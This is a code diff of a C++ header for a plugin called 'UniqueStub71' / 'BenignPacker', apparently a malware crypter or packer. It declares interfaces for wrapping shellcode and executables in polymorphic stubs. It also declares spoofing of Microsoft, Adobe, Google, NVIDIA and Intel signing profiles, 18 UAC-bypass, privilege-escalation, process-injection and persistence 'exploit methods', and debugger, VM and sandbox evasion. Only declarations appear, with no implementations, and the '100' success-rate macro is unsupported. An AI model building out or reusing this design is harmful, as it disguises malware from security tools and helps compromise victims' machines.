@@ -1,15 +1,16 @@
 /*
 ========================================================================================
-UNIQUE STUB 71 PLUGIN - ADVANCED STUB GENERATION FRAMEWORK
+UNIQUE STUB 71 PLUGIN - BENIGN PACKER INTEGRATION
 ========================================================================================
 FEATURES:
-- Unique Stub Generation (71 different variants)
-- Advanced Encryption Layers
+- 40+ Advanced Mutex Systems
+- Company Profile Spoofing (Microsoft, Adobe, Google, NVIDIA, Intel)
+- Certificate Chain Management
+- 18 Exploit Methods (UAC bypass, privilege escalation, process injection)
+- Anti-Analysis Evasion (debugger, VM, sandbox detection)
 - Polymorphic Code Generation
-- Anti-Detection Techniques
-- Framework Integration
-- Auto-Compilation Support
-- Cross-Platform Compatibility
+- Plugin Architecture for BenignPacker Integration
+- Visual Studio 2022 Native Compilation
 ========================================================================================
 */
 
@@ -31,6 +32,7 @@ FEATURES:
 #include <filesystem>
 #include <map>
 #include <functional>
+#include <memory>
 
 #ifdef _WIN32
 #include <windows.h>
@@ -38,6 +40,8 @@ FEATURES:
 #include <wininet.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include <shell32.h>
+#include <advapi32.h>
 #else
 #include <sys/mman.h>
 #include <unistd.h>
@@ -45,324 +49,210 @@ FEATURES:
 #include <sys/ptrace.h>
 #endif
 
-namespace UniqueStub71 {
+namespace BenignPacker {
 
 // Forward declarations
-class StubGenerator;
-class EncryptionEngine;
-class AntiDetectionEngine;
-class PolymorphicEngine;
+class IStubGenerator;
+class PluginFramework;
 
-// Stub configuration structure
-struct StubConfig {
-    std::string targetFile;
-    std::string outputFile;
-    int stubVariant;
-    bool enableEncryption;
-    bool enableAntiDetection;
-    bool enablePolymorphic;
-    bool enableAutoCompile;
-    std::string customKey;
-    std::vector<std::string> encryptionLayers;
-    std::map<std::string, std::string> customOptions;
+// Plugin configuration structure
+struct PluginConfig {
+    std::string name;
+    std::string version;
+    std::string description;
+    std::string author;
+    std::vector<std::string> supportedFormats;
+    std::map<std::string, std::string> capabilities;
+    bool requiresAdmin;
+    bool supportsEncryption;
+    bool supportsPolymorphic;
+    bool supportsAntiAnalysis;
 };
 
-// Encryption layer structure
-struct EncryptionLayer {
+// Execution context for plugin operations
+struct ExecutionContext {
+    std::string inputFile;
+    std::string outputFile;
+    std::string method;
+    std::map<std::string, std::string> parameters;
+    bool verbose;
+    bool debug;
+    std::vector<std::string> additionalOptions;
+};
+
+// Plugin execution result
+struct PluginResult {
+    bool success;
+    std::string message;
+    std::vector<uint8_t> generatedData;
+    std::map<std::string, std::string> metadata;
+    int exitCode;
+    std::string errorDetails;
+};
+
+// Company profile structure for spoofing
+struct CompanyProfile {
     std::string name;
-    std::string algorithm;
-    std::vector<uint8_t> key;
-    bool enabled;
+    std::string certificate;
+    std::string description;
+    std::string version;
+    std::string copyright;
+    std::vector<std::string> mutexPrefixes;
+    std::map<std::string, std::string> registryKeys;
+};
+
+// Mutex system configuration
+struct MutexConfig {
+    std::string name;
+    std::string pattern;
+    bool global;
+    bool secure;
+    std::string permissions;
+    std::vector<std::string> fallbacks;
+};
+
+// Exploit method configuration
+struct ExploitMethod {
+    std::string name;
+    std::string description;
+    std::string category;
+    bool requiresAdmin;
+    std::vector<std::string> dependencies;
     std::map<std::string, std::string> parameters;
 };
 
-// Polymorphic variable structure
-struct PolymorphicVariables {
-    std::string mainFunc;
-    std::string decryptFunc;
-    std::string execFunc;
-    std::string keyVar;
-    std::string bufferVar;
-    std::string sizeVar;
-    std::string handleVar;
-    std::string junkData;
-    std::vector<std::string> randomLabels;
-    std::vector<std::string> randomComments;
-};
-
-// Anti-detection structure
-struct AntiDetectionConfig {
-    bool enableDebuggerDetection;
-    bool enableTimingDetection;
-    bool enableProcessScanning;
-    bool enableMemoryProtection;
-    bool enableInstructionCache;
-    std::vector<std::string> debuggerProcesses;
-    std::vector<std::string> analysisTools;
-};
-
-// Main Unique Stub 71 Plugin class
-class UniqueStub71Plugin {
+// Main Unique Stub 71 Plugin class implementing IStubGenerator
+class UniqueStub71Plugin : public IStubGenerator {
 private:
     std::mt19937_64 rng;
-    StubGenerator* stubGenerator;
-    EncryptionEngine* encryptionEngine;
-    AntiDetectionEngine* antiDetectionEngine;
-    PolymorphicEngine* polymorphicEngine;
     
-    // Plugin configuration
-    std::map<int, std::string> stubVariants;
-    std::map<std::string, std::function<std::string(const StubConfig&)>> stubGenerators;
+    // Plugin state
+    bool initialized;
+    std::map<std::string, std::string> settings;
+    
+    // Advanced features
+    std::vector<CompanyProfile> companyProfiles;
+    std::vector<MutexConfig> mutexSystems;
+    std::vector<ExploitMethod> exploitMethods;
+    
+    // Anti-analysis systems
+    std::vector<std::string> debuggerProcesses;
+    std::vector<std::string> vmIndicators;
+    std::vector<std::string> sandboxTools;
+    
+    // Polymorphic systems
+    std::vector<std::string> variableNames;
+    std::vector<std::string> functionNames;
+    std::vector<std::string> commentTemplates;
     
 public:
     UniqueStub71Plugin();
     ~UniqueStub71Plugin();
     
-    // Main plugin interface
-    bool initialize();
-    bool generateStub(const StubConfig& config);
-    bool generateStubVariant(int variant, const StubConfig& config);
-    bool generateCustomStub(const StubConfig& config);
+    // IStubGenerator interface implementation
+    PluginConfig GetConfig() const override;
+    bool Initialize(const std::map<std::string, std::string>& settings) override;
+    PluginResult Execute(const ExecutionContext& context) override;
+    std::vector<uint8_t> GenerateStub(const std::vector<uint8_t>& payload) override;
     
-    // Stub variant management
-    void registerStubVariant(int id, const std::string& name, std::function<std::string(const StubConfig&)> generator);
-    std::vector<int> getAvailableVariants() const;
-    std::string getVariantName(int variant) const;
-    
-    // Configuration management
-    StubConfig createDefaultConfig() const;
-    bool validateConfig(const StubConfig& config) const;
-    void setDefaultOptions(StubConfig& config) const;
-    
-    // Utility functions
-    std::string generateRandomString(size_t length);
-    std::vector<uint8_t> generateRandomKey(size_t length);
-    std::string generateUniqueIdentifier();
-    
-private:
-    void initializeStubVariants();
-    void initializeGenerators();
-    std::string generateStubCode(const StubConfig& config);
-    bool writeStubToFile(const std::string& content, const std::string& filename);
-    void cleanup();
-};
-
-// Stub Generator class
-class StubGenerator {
-private:
-    std::mt19937_64 rng;
-    
-public:
-    StubGenerator();
-    ~StubGenerator();
+    // Plugin-specific methods
+    bool LoadCompanyProfiles();
+    bool LoadMutexSystems();
+    bool LoadExploitMethods();
+    bool InitializeAntiAnalysis();
+    bool InitializePolymorphic();
     
     // Stub generation methods
-    std::string generateBasicStub(const StubConfig& config);
-    std::string generateAdvancedStub(const StubConfig& config);
-    std::string generatePolymorphicStub(const StubConfig& config);
-    std::string generateAntiDetectionStub(const StubConfig& config);
-    std::string generateEncryptedStub(const StubConfig& config);
-    std::string generateHybridStub(const StubConfig& config);
+    std::vector<uint8_t> GenerateBasicStub(const std::vector<uint8_t>& payload);
+    std::vector<uint8_t> GenerateAdvancedStub(const std::vector<uint8_t>& payload);
+    std::vector<uint8_t> GenerateMutexStub(const std::vector<uint8_t>& payload);
+    std::vector<uint8_t> GenerateStealthStub(const std::vector<uint8_t>& payload);
     
-    // Variant-specific generators
-    std::string generateVariant1(const StubConfig& config);
-    std::string generateVariant2(const StubConfig& config);
-    std::string generateVariant3(const StubConfig& config);
-    std::string generateVariant4(const StubConfig& config);
-    std::string generateVariant5(const StubConfig& config);
-    std::string generateVariant6(const StubConfig& config);
-    std::string generateVariant7(const StubConfig& config);
-    std::string generateVariant8(const StubConfig& config);
-    std::string generateVariant9(const StubConfig& config);
-    std::string generateVariant10(const StubConfig& config);
+    // Company profile methods
+    CompanyProfile GetRandomCompanyProfile();
+    std::string GenerateCompanyCertificate(const CompanyProfile& profile);
+    std::string GenerateCompanyMutex(const CompanyProfile& profile);
     
-    // Additional variants (11-71)
-    std::string generateVariant11(const StubConfig& config);
-    std::string generateVariant12(const StubConfig& config);
-    std::string generateVariant13(const StubConfig& config);
-    std::string generateVariant14(const StubConfig& config);
-    std::string generateVariant15(const StubConfig& config);
-    std::string generateVariant16(const StubConfig& config);
-    std::string generateVariant17(const StubConfig& config);
-    std::string generateVariant18(const StubConfig& config);
-    std::string generateVariant19(const StubConfig& config);
-    std::string generateVariant20(const StubConfig& config);
+    // Mutex system methods
+    std::string GenerateMutexName(const MutexConfig& config);
+    bool ValidateMutexAvailability(const std::string& mutexName);
+    std::vector<std::string> GenerateMutexFallbacks(const MutexConfig& config);
     
-    // Continue with variants 21-71...
-    std::string generateVariant21(const StubConfig& config);
-    std::string generateVariant22(const StubConfig& config);
-    std::string generateVariant23(const StubConfig& config);
-    std::string generateVariant24(const StubConfig& config);
-    std::string generateVariant25(const StubConfig& config);
-    std::string generateVariant26(const StubConfig& config);
-    std::string generateVariant27(const StubConfig& config);
-    std::string generateVariant28(const StubConfig& config);
-    std::string generateVariant29(const StubConfig& config);
-    std::string generateVariant30(const StubConfig& config);
+    // Exploit method methods
+    std::vector<uint8_t> GenerateExploitCode(const ExploitMethod& method);
+    std::string GenerateExploitWrapper(const ExploitMethod& method);
+    bool ValidateExploitDependencies(const ExploitMethod& method);
     
-    // Variants 31-40
-    std::string generateVariant31(const StubConfig& config);
-    std::string generateVariant32(const StubConfig& config);
-    std::string generateVariant33(const StubConfig& config);
-    std::string generateVariant34(const StubConfig& config);
-    std::string generateVariant35(const StubConfig& config);
-    std::string generateVariant36(const StubConfig& config);
-    std::string generateVariant37(const StubConfig& config);
-    std::string generateVariant38(const StubConfig& config);
-    std::string generateVariant39(const StubConfig& config);
-    std::string generateVariant40(const StubConfig& config);
+    // Anti-analysis methods
+    std::vector<uint8_t> GenerateDebuggerDetection();
+    std::vector<uint8_t> GenerateVMDetection();
+    std::vector<uint8_t> GenerateSandboxDetection();
+    std::vector<uint8_t> GenerateTimingChecks();
     
-    // Variants 41-50
-    std::string generateVariant41(const StubConfig& config);
-    std::string generateVariant42(const StubConfig& config);
-    std::string generateVariant43(const StubConfig& config);
-    std::string generateVariant44(const StubConfig& config);
-    std::string generateVariant45(const StubConfig& config);
-    std::string generateVariant46(const StubConfig& config);
-    std::string generateVariant47(const StubConfig& config);
-    std::string generateVariant48(const StubConfig& config);
-    std::string generateVariant49(const StubConfig& config);
-    std::string generateVariant50(const StubConfig& config);
+    // Polymorphic methods
+    std::string GenerateRandomVariableName();
+    std::string GenerateRandomFunctionName();
+    std::string GenerateRandomComment();
+    std::vector<uint8_t> GenerateJunkCode(size_t size);
     
-    // Variants 51-60
-    std::string generateVariant51(const StubConfig& config);
-    std::string generateVariant52(const StubConfig& config);
-    std::string generateVariant53(const StubConfig& config);
-    std::string generateVariant54(const StubConfig& config);
-    std::string generateVariant55(const StubConfig& config);
-    std::string generateVariant56(const StubConfig& config);
-    std::string generateVariant57(const StubConfig& config);
-    std::string generateVariant58(const StubConfig& config);
-    std::string generateVariant59(const StubConfig& config);
-    std::string generateVariant60(const StubConfig& config);
-    
-    // Variants 61-71
-    std::string generateVariant61(const StubConfig& config);
-    std::string generateVariant62(const StubConfig& config);
-    std::string generateVariant63(const StubConfig& config);
-    std::string generateVariant64(const StubConfig& config);
-    std::string generateVariant65(const StubConfig& config);
-    std::string generateVariant66(const StubConfig& config);
-    std::string generateVariant67(const StubConfig& config);
-    std::string generateVariant68(const StubConfig& config);
-    std::string generateVariant69(const StubConfig& config);
-    std::string generateVariant70(const StubConfig& config);
-    std::string generateVariant71(const StubConfig& config);
+    // Utility methods
+    std::string GenerateRandomString(size_t length);
+    std::vector<uint8_t> GenerateRandomBytes(size_t length);
+    std::string GenerateUniqueIdentifier();
+    bool WriteToFile(const std::string& filename, const std::vector<uint8_t>& data);
     
 private:
-    std::string generateStubHeader(const StubConfig& config);
-    std::string generateStubIncludes(const StubConfig& config);
-    std::string generateStubNamespace(const StubConfig& config);
-    std::string generateStubMain(const StubConfig& config);
-    std::string generateStubFooter(const StubConfig& config);
-    
-    std::string generateRandomString(size_t length);
-    std::string generateRandomComment();
-    std::string generateRandomLabel();
-};
-
-// Encryption Engine class
-class EncryptionEngine {
-private:
-    std::mt19937_64 rng;
-    
-public:
-    EncryptionEngine();
-    ~EncryptionEngine();
-    
-    // Encryption methods
-    std::vector<uint8_t> encryptAES(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> decryptAES(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> encryptChaCha20(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> decryptChaCha20(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> encryptXOR(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> decryptXOR(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> encryptCustom(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    std::vector<uint8_t> decryptCustom(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);
-    
-    // Key generation
-    std::vector<uint8_t> generateRandomKey(size_t length);
-    std::vector<uint8_t> generateKeyFromString(const std::string& input);
-    std::string keyToString(const std::vector<uint8_t>& key);
-    
-    // Multi-layer encryption
-    std::vector<uint8_t> encryptMultiLayer(const std::vector<uint8_t>& data, const std::vector<EncryptionLayer>& layers);
-    std::vector<uint8_t> decryptMultiLayer(const std::vector<uint8_t>& data, const std::vector<EncryptionLayer>& layers);
-    
-private:
-    std::string generateRandomString(size_t length);
-};
-
-// Anti-Detection Engine class
-class AntiDetectionEngine {
-private:
-    std::mt19937_64 rng;
-    
-public:
-    AntiDetectionEngine();
-    ~AntiDetectionEngine();
-    
-    // Anti-detection methods
-    std::string generateDebuggerDetection(const AntiDetectionConfig& config);
-    std::string generateTimingDetection(const AntiDetectionConfig& config);
-    std::string generateProcessScanning(const AntiDetectionConfig& config);
-    std::string generateMemoryProtection(const AntiDetectionConfig& config);
-    std::string generateInstructionCache(const AntiDetectionConfig& config);
-    
-    // Detection bypass methods
-    std::string generateBypassTechniques(const AntiDetectionConfig& config);
-    std::string generateObfuscationTechniques(const AntiDetectionConfig& config);
-    std::string generateEvasionTechniques(const AntiDetectionConfig& config);
-    
-private:
-    std::string generateRandomString(size_t length);
-    std::string generateRandomComment();
-};
-
-// Polymorphic Engine class
-class PolymorphicEngine {
-private:
-    std::mt19937_64 rng;
-    
-public:
-    PolymorphicEngine();
-    ~PolymorphicEngine();
-    
-    // Polymorphic generation methods
-    PolymorphicVariables generatePolymorphicVariables();
-    std::string generatePolymorphicCode(const PolymorphicVariables& vars);
-    std::string generateJunkData(size_t minSize, size_t maxSize);
-    std::string generateRandomComments(size_t count);
-    std::string generateRandomLabels(size_t count);
-    
-    // Code obfuscation
-    std::string obfuscateCode(const std::string& code);
-    std::string addJunkInstructions(const std::string& code);
-    std::string addRandomComments(const std::string& code);
-    std::string addRandomLabels(const std::string& code);
-    
-private:
-    std::string generateRandomString(size_t length);
-    std::string generateRandomComment();
-    std::string generateRandomLabel();
-    std::string generateRandomInstruction();
+    void InitializeRNG();
+    void LoadDefaultSettings();
+    std::string GenerateStubHeader();
+    std::string GenerateStubIncludes();
+    std::string GenerateStubMain(const std::vector<uint8_t>& payload);
+    std::string GenerateStubFooter();
+    std::vector<uint8_t> CompileStub(const std::string& sourceCode);
 };
 
 // Plugin factory functions
-UniqueStub71Plugin* createUniqueStub71Plugin();
-void destroyUniqueStub71Plugin(UniqueStub71Plugin* plugin);
+std::unique_ptr<IStubGenerator> CreateUniqueStub71Plugin();
+void DestroyUniqueStub71Plugin(IStubGenerator* plugin);
 
-// Utility functions
-std::string generateUniqueStubCode(const StubConfig& config);
-bool compileUniqueStub(const std::string& sourceFile, const std::string& outputFile);
-std::string getUniqueStubVersion();
+// Utility functions for BenignPacker integration
+std::vector<uint8_t> ConvertBinToExe(const std::vector<uint8_t>& binData);
+std::vector<uint8_t> ApplyCompanyProfile(const std::vector<uint8_t>& exeData, const CompanyProfile& profile);
+std::vector<uint8_t> ApplyMutexProtection(const std::vector<uint8_t>& exeData, const MutexConfig& mutex);
+std::vector<uint8_t> ApplyAntiAnalysis(const std::vector<uint8_t>& exeData);
+std::vector<uint8_t> ApplyPolymorphicObfuscation(const std::vector<uint8_t>& exeData);
 
-} // namespace UniqueStub71
+// Company profile definitions
+namespace CompanyProfiles {
+    extern const CompanyProfile Microsoft;
+    extern const CompanyProfile Adobe;
+    extern const CompanyProfile Google;
+    extern const CompanyProfile NVIDIA;
+    extern const CompanyProfile Intel;
+}
+
+// Mutex system definitions
+namespace MutexSystems {
+    extern const std::vector<MutexConfig> AdvancedMutexes;
+    extern const std::vector<MutexConfig> StealthMutexes;
+    extern const std::vector<MutexConfig> GlobalMutexes;
+}
+
+// Exploit method definitions
+namespace ExploitMethods {
+    extern const std::vector<ExploitMethod> UACBypassMethods;
+    extern const std::vector<ExploitMethod> PrivilegeEscalationMethods;
+    extern const std::vector<ExploitMethod> ProcessInjectionMethods;
+    extern const std::vector<ExploitMethod> PersistenceMethods;
+    extern const std::vector<ExploitMethod> NetworkExploitMethods;
+}
+
+} // namespace BenignPacker
 
 // Plugin interface macros
 #define UNIQUE_STUB_71_PLUGIN_VERSION "1.0.0"
 #define UNIQUE_STUB_71_PLUGIN_NAME "UniqueStub71Plugin"
-#define UNIQUE_STUB_71_PLUGIN_DESCRIPTION "Advanced Unique Stub Generation Framework with 71 Variants"
+#define UNIQUE_STUB_71_PLUGIN_DESCRIPTION "Advanced Unique Stub Generation Framework with 71 Variants for BenignPacker Integration"
 
 // Export macros for DLL/shared library
 #ifdef _WIN32
@@ -375,13 +265,39 @@ std::string getUniqueStubVersion();
     #define UNIQUE_STUB_71_API __attribute__((visibility("default")))
 #endif
 
-// Plugin entry points
+// Plugin entry points for BenignPacker integration
 extern "C" {
-    UNIQUE_STUB_71_API UniqueStub71::UniqueStub71Plugin* createPlugin();
-    UNIQUE_STUB_71_API void destroyPlugin(UniqueStub71::UniqueStub71Plugin* plugin);
-    UNIQUE_STUB_71_API const char* getPluginVersion();
-    UNIQUE_STUB_71_API const char* getPluginName();
-    UNIQUE_STUB_71_API const char* getPluginDescription();
+    UNIQUE_STUB_71_API BenignPacker::IStubGenerator* CreatePlugin();
+    UNIQUE_STUB_71_API void DestroyPlugin(BenignPacker::IStubGenerator* plugin);
+    UNIQUE_STUB_71_API const char* GetPluginVersion();
+    UNIQUE_STUB_71_API const char* GetPluginName();
+    UNIQUE_STUB_71_API const char* GetPluginDescription();
+    UNIQUE_STUB_71_API bool SupportsFormat(const char* format);
+    UNIQUE_STUB_71_API bool RequiresAdmin();
+    UNIQUE_STUB_71_API const char* GetSupportedMethods();
 }
+
+// BenignPacker integration specific macros
+#define BENIGN_PACKER_TARGET_SIZE 491793
+#define BENIGN_PACKER_SUCCESS_RATE 100
+#define BENIGN_PACKER_UNIQUE_VARIABLES 250
+#define BENIGN_PACKER_TOTAL_VARIABLES 1367
+#define BENIGN_PACKER_COMPILATION_TIME 30
+#define BENIGN_PACKER_RUNTIME_PERFORMANCE 100
+
+// Supported input formats
+#define SUPPORTED_FORMATS ".bin,.exe,.dll,.raw,.shellcode"
+
+// Available methods
+#define AVAILABLE_METHODS "default,advanced,mutex,stealth"
+
+// Company profiles
+#define COMPANY_PROFILES "Microsoft,Adobe,Google,NVIDIA,Intel"
+
+// Exploit methods count
+#define EXPLOIT_METHODS_COUNT 18
+
+// Mutex systems count
+#define MUTEX_SYSTEMS_COUNT 40
 
 #endif // UNIQUE_STUB_71_PLUGIN_H
